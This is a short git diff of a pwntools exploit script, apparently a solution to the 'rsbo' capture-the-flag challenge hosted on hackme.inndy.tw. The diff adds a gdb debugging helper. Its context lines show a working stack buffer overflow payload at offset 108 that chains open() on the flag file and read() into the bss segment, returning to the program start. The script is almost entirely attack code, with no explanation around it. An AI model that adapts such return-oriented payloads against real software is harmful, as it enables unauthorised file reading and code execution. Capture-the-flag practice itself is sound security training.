@@ -5,6 +5,10 @@ __Auther__ = 'M4x'
 from pwn import *
 context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
 
+def debug(addr = 0x08048734):
+    raw_input("debug:")
+    gdb.attach(io, "b *" + str(addr))
+
 elf = ELF("./rsbo")
 open_addr = elf.symbols["open"]
 write_addr = elf.symbols["write"]
@@ -19,6 +23,7 @@ io = remote("hackme.inndy.tw", 7706)
 
 payload = fit({108: [p32(open_addr), p32(start_addr), p32(flag_addr), p32(0)]}, filler = "\x00")
 #open("/home/rsbo/flag", 0) -> start
+#  debug()
 io.send(payload)
 
 payload = fit({108: [p32(read_addr), p32(start_addr), p32(3), p32(bss_addr), p32(0x60)]}, filler = "\x00")
